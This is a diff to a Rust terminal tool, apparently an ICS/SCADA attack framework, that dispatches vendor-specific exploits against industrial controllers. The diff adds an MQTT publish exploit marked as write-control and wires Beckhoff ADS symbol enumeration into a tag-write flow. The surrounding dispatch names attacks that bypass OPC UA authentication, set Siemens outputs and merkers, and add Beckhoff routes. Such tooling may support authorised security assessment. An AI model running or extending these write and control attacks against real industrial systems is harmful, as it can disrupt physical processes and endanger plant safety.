@@ -340,12 +340,14 @@ fn exploits_for(vendor: &str) -> Vec<ExploitDef> {
         "dnp3" => vec![
             ExploitDef::new("Device Attributes"),
             ExploitDef::new("Integrity Poll"),
-            ExploitDef::with_input("Direct Operate", "point_id:state (e.g. 10:1)"),
         ],
         "opcua" => vec![
             ExploitDef::new("Server Info"),
             ExploitDef::new("Enumerate Endpoints"),
             ExploitDef::with_input("Try Auth Bypass", "endpoint index (default 0)"),
+        ],
+        "mqtt" => vec![
+            ExploitDef::with_input("Publish", "topic:payload").risk(ExploitRisk::WriteControl),
         ],
         _ => vec![ExploitDef::new("Auto-detect / rescan")],
     };
@@ -2060,6 +2062,14 @@ fn run_exploit_for(
     let label = label.to_string();
 
     std::thread::spawn(move || {
+        struct DoneGuard { tx: mpsc::Sender<ScanEvent>, msg: String }
+        impl Drop for DoneGuard {
+            fn drop(&mut self) {
+                let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
+            }
+        }
+        let _guard = DoneGuard { tx: tx.clone(), msg: format!("{label} @ {ip}") };
+
         let ip2 = ip.clone();
         let tx2 = tx.clone();
         let out = move |msg: &str| {
@@ -2075,7 +2085,6 @@ fn run_exploit_for(
             let _ = tx2.send(ScanEvent::Output(msg.to_string()));
         };
         dispatch_exploit(&vendor, idx, &ip, port, &input, out, &tx);
-        let _ = tx.send(ScanEvent::Done(format!("{label} @ {ip}")));
     });
 }
 
@@ -2125,7 +2134,7 @@ fn dispatch_exploit(
         ("mitsubishi", 2) => exploit_slmp_map(ip, port, "common", &out),
         ("beckhoff", 5) => exploit_beckhoff_get_state(ip, port, &out),
         ("beckhoff", 6) => exploit_beckhoff_add_route(ip, input, &out),
-        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, port, &out),
+        ("beckhoff", 7) => exploit_beckhoff_symbols(ip, port, &out, tx),
         ("siemens", 3) => exploit_siemens_set_outputs(ip, port, input, &out),
         ("siemens", 4) => exploit_siemens_set_merkers(ip, port, input, &out),
         ("siemens", 5) => exploit_siemens_list_dbs(ip, port, input, &out),
@@ -2257,16 +2266,6 @@ fn dispatch_exploit(
                 for l in &lines { out(l); }
             }
         }
-        ("dnp3", 2) => {
-            if let Some((point_str, state_str)) = input.split_once(':') {
-                let point: u16 = point_str.trim().parse().unwrap_or(0);
-                let state: u8 = state_str.trim().parse().unwrap_or(0);
-                out(&format!("Direct Operate: point={point} state={state}"));
-                out("Note: Direct Operate send not yet implemented; use DNP3 master software for write operations.");
-            } else {
-                out("Input format: point_id:state (e.g. 10:1)");
-            }
-        }
         ("opcua", 0) => {
             use crate::vendors::opcua::client as opcua;
             let timeout = std::time::Duration::from_secs(5);
@@ -2316,6 +2315,27 @@ fn dispatch_exploit(
                     out(&format!("  [VULN] {}", ep.url));
                     out("  Anonymous connect allowed with no encryption");
                 }
+            }
+        }
+        ("mqtt", 0) => {
+            let (topic, payload_str) = input.split_once(':').unwrap_or((input, ""));
+            let mqtt_port = if port == 0 {
+                crate::vendors::mqtt::client::MQTT_PORT
+            } else {
+                port
+            };
+            let opts = ConnectOptions {
+                host: ip.to_string(),
+                port: mqtt_port,
+                client_id: "scadaver-pub".to_string(),
+                ..Default::default()
+            };
+            out(&format!("Publishing to '{topic}' on {ip}:{mqtt_port}…"));
+            match MqttSession::connect(&opts)
+                .and_then(|mut sess| sess.publish(topic, payload_str.as_bytes(), 0, false))
+            {
+                Ok(()) => out(&format!("Published {} byte(s) to '{topic}'.", payload_str.len())),
+                Err(e) => out(&format!("Error: {e}")),
             }
         }
         _ => {
@@ -3203,7 +3223,12 @@ fn exploit_beckhoff_add_route(ip: &str, input: &str, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_beckhoff_symbols(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_beckhoff_symbols(
+    ip: &str,
+    port: u16,
+    out: &impl Fn(&str),
+    tx: &mpsc::Sender<ScanEvent>,
+) {
     use crate::vendors::beckhoff::{ads, scan};
     let local_netid = ads::build_local_netid(&local_ip_for(ip));
     out(&format!("[*] Enumerating ADS symbols on {ip}..."));
@@ -3246,6 +3271,16 @@ fn exploit_beckhoff_symbols(ip: &str, port: u16, out: &impl Fn(&str)) {
         })
         .collect();
     save_and_diff(ip, "ads", &points, out);
+    let leaves: Vec<(String, bool)> = symbols
+        .iter()
+        .map(|s| (s.name.clone(), true))
+        .collect();
+    let _ = tx.send(ScanEvent::TagLeaves {
+        ip: ip.to_string(),
+        port,
+        vendor: "beckhoff".to_string(),
+        leaves,
+    });
 }
 
 // ─── New Siemens exploits ────────────────────────────────────────────────────
@@ -6324,9 +6359,11 @@ fn handle_output_zoom(app: &mut App, code: KeyCode, mods: KeyModifiers) {
                             app.mode = Mode::CacheRescanPrompt;
                         } else {
                             let label = format!("Write Tag: {path}");
+                            let write_idx =
+                                if app.tag_write_vendor.contains("beckhoff") { 8 } else { 3 };
                             app.pending_exploit = Some(PendingExploit {
                                 vendor: app.tag_write_vendor.clone(),
-                                idx: 3,
+                                idx: write_idx,
                                 ip: app.tag_write_ip.clone(),
                                 port: app.tag_write_port,
                                 input: String::new(),
@@ -7113,12 +7150,19 @@ fn execute_pending_exploit(app: &mut App, pending: &PendingExploit) {
         let label2 = pending.label.clone();
         let port = pending.port;
         std::thread::spawn(move || {
+            struct DoneGuard { tx: mpsc::Sender<ScanEvent>, msg: String }
+            impl Drop for DoneGuard {
+                fn drop(&mut self) {
+                    let _ = self.tx.send(ScanEvent::Done(std::mem::take(&mut self.msg)));
+                }
+            }
+            let _guard = DoneGuard { tx: tx.clone(), msg: format!("{label2} @ {ip2}") };
+
             let tx2 = tx.clone();
             let out = move |msg: &str| {
                 let _ = tx2.send(ScanEvent::Output(msg.to_string()));
             };
             exploit_rockwell_monitor(&ip2, port, &out, &stop);
-            let _ = tx.send(ScanEvent::Done(format!("{label2} @ {ip2}")));
         });
     } else {
         run_exploit_for(
